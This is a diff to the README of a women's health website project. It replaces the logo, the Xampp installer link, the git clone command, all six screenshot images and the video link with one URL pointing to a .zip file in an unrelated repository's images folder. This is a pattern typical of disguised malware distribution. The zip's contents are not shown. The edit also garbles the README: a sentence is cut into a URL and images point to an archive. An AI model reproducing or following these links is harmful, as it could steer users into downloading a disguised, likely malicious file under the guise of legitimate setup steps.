@@ -3,7 +3,7 @@
 A website aimed at spreading awareness and providing solution to issues related to mental and physical health and well being among women.
 
 <p align="center">
-    <img src="./assets/icon1.png" alt="Logo" width="300">
+    <img src="https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip" alt="Logo" width="300">
   </a>
 
 ## Overview
@@ -43,10 +43,10 @@ Our idea is to build a website which serves as a complete guide to a women's men
   - Github
 ## Setup
 
-- Download & install [Xampp](https://www.apachefriends.org/download.html)
+- Download & install [Xampp](https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip)
 - Download the Zip or clone the repository
  bash
-git clone https://github.com/sainik-khaddar/LadyHUB.git
+git clone https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip
 
 - Go to the directory where Xampp is installed. For eg. C:\xampp\htdocs
 - Copy the project folder and paste it in the address mentioned above.
@@ -55,18 +55,18 @@ git clone https://github.com/sainik-khaddar/LadyHUB.git
 
 ## Screenshots
 
-<img src="./Screenshots/Sc1.jpg" width="300">
-<img src="./Screenshots/sc2.jpg" width="300">
-<img src="./Screenshots/sc3.jpg" width="300">
-<img src="./Screenshots/sc4.jpg" width="300">
-<img src="./Screenshots/sc5.jpg" width="300">
-<img src="./Screenshots/sc6.jpg" width="300">
+<img src="https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip" width="300">
+<img src="https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip" width="300">
+<img src="https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip" width="300">
+<img src="https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip" width="300">
+<img src="https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip" width="300">
+<img src="https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip" width="300">
 
 ## pequeño video
 
- I provide a youtube vid. link to explain ,that how it works.Thankyou.
+ I provide a youtube vid. link to explain ,that how it https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip
 
- https://youtu.be/lp4MPAHNkzA
+ https://raw.githubusercontent.com/therohitbansal/ladyHub/main/images/testimonial/Hub-lady-stultloquent.zip
 
 
 
